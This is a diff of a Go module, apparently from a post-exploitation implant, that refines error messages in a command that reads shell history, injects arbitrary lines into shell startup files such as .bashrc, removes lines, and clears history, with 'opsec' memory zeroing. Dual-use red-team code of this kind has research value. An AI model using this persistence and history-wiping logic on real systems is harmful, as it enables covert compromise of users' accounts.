@@ -66,7 +66,7 @@ var systemConfigFiles = []string{
 
 func (c *ShellConfigCommand) Execute(task structs.Task) structs.CommandResult {
 	if task.Params == "" {
-		return errorResult("Error: parameters required. Actions: history, list, read, inject, remove")
+		return errorResult("parameters required. Actions: history, list, read, inject, remove")
 	}
 
 	var args shellConfigArgs
@@ -118,7 +118,7 @@ func getHomeDir(targetUser string) (string, error) {
 func shellHistory(args shellConfigArgs) structs.CommandResult {
 	homeDir, err := getHomeDir(args.User)
 	if err != nil {
-		return errorf("Error: %v", err)
+		return errorf("failed to resolve home directory for shell history: %v", err)
 	}
 
 	maxLines := args.Lines
@@ -164,7 +164,7 @@ func shellHistory(args shellConfigArgs) structs.CommandResult {
 func shellList(args shellConfigArgs) structs.CommandResult {
 	homeDir, err := getHomeDir(args.User)
 	if err != nil {
-		return errorf("Error: %v", err)
+		return errorf("failed to resolve home directory for config listing: %v", err)
 	}
 
 	var sb strings.Builder
@@ -229,7 +229,7 @@ func shellList(args shellConfigArgs) structs.CommandResult {
 
 func shellRead(args shellConfigArgs) structs.CommandResult {
 	if args.File == "" {
-		return errorResult("Error: file parameter required (e.g., .bashrc, .zshrc, /etc/profile)")
+		return errorResult("file parameter required (e.g., .bashrc, .zshrc, /etc/profile)")
 	}
 
 	path := args.File
@@ -237,14 +237,14 @@ func shellRead(args shellConfigArgs) structs.CommandResult {
 	if !filepath.IsAbs(path) {
 		homeDir, err := getHomeDir(args.User)
 		if err != nil {
-			return errorf("Error: %v", err)
+			return errorf("failed to resolve home directory for reading %s: %v", args.File, err)
 		}
 		path = filepath.Join(homeDir, path)
 	}
 
 	content, err := os.ReadFile(path)
 	if err != nil {
-		return errorf("Error reading %s: %v", path, err)
+		return errorf("reading %s: %v", path, err)
 	}
 	defer structs.ZeroBytes(content) // opsec: clear shell config data
 
@@ -253,17 +253,17 @@ func shellRead(args shellConfigArgs) structs.CommandResult {
 
 func shellInject(args shellConfigArgs) structs.CommandResult {
 	if args.File == "" {
-		return errorResult("Error: file parameter required (e.g., .bashrc, .zshrc, .profile)")
+		return errorResult("file parameter required (e.g., .bashrc, .zshrc, .profile)")
 	}
 	if args.Line == "" {
-		return errorResult("Error: line parameter required (command to inject)")
+		return errorResult("line parameter required (command to inject)")
 	}
 
 	path := args.File
 	if !filepath.IsAbs(path) {
 		homeDir, err := getHomeDir(args.User)
 		if err != nil {
-			return errorf("Error: %v", err)
+			return errorf("failed to resolve home directory for injecting into %s: %v", args.File, err)
 		}
 		path = filepath.Join(homeDir, path)
 	}
@@ -284,7 +284,7 @@ func shellInject(args shellConfigArgs) structs.CommandResult {
 	// Append to file
 	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
-		return errorf("Error opening %s: %v", path, err)
+		return errorf("opening %s: %v", path, err)
 	}
 	defer f.Close()
 
@@ -295,7 +295,7 @@ func shellInject(args shellConfigArgs) structs.CommandResult {
 	line += "\n"
 
 	if _, err := f.WriteString(line); err != nil {
-		return errorf("Error writing to %s: %v", path, err)
+		return errorf("writing to %s: %v", path, err)
 	}
 
 	return successf("Injected into %s:\n  %s", path, strings.TrimSpace(line))
@@ -303,24 +303,24 @@ func shellInject(args shellConfigArgs) structs.CommandResult {
 
 func shellRemove(args shellConfigArgs) structs.CommandResult {
 	if args.File == "" {
-		return errorResult("Error: file parameter required")
+		return errorResult("file parameter required")
 	}
 	if args.Line == "" {
-		return errorResult("Error: line parameter required (exact line to remove)")
+		return errorResult("line parameter required (exact line to remove)")
 	}
 
 	path := args.File
 	if !filepath.IsAbs(path) {
 		homeDir, err := getHomeDir(args.User)
 		if err != nil {
-			return errorf("Error: %v", err)
+			return errorf("failed to resolve home directory for removing line from %s: %v", args.File, err)
 		}
 		path = filepath.Join(homeDir, path)
 	}
 
 	content, err := os.ReadFile(path)
 	if err != nil {
-		return errorf("Error reading %s: %v", path, err)
+		return errorf("reading %s: %v", path, err)
 	}
 	defer structs.ZeroBytes(content) // opsec: clear shell config data
 
@@ -341,7 +341,7 @@ func shellRemove(args shellConfigArgs) structs.CommandResult {
 	}
 
 	if err := os.WriteFile(path, []byte(strings.Join(newLines, "\n")), 0644); err != nil {
-		return errorf("Error writing %s: %v", path, err)
+		return errorf("writing %s: %v", path, err)
 	}
 
 	return successf("Removed %d line(s) from %s", removed, path)
@@ -353,7 +353,7 @@ func shellRemove(args shellConfigArgs) structs.CommandResult {
 func shellClear(args shellConfigArgs) structs.CommandResult {
 	homeDir, err := getHomeDir(args.User)
 	if err != nil {
-		return errorf("Error: %v", err)
+		return errorf("failed to resolve home directory for clearing shell history: %v", err)
 	}
 
 	// Determine which files to clear
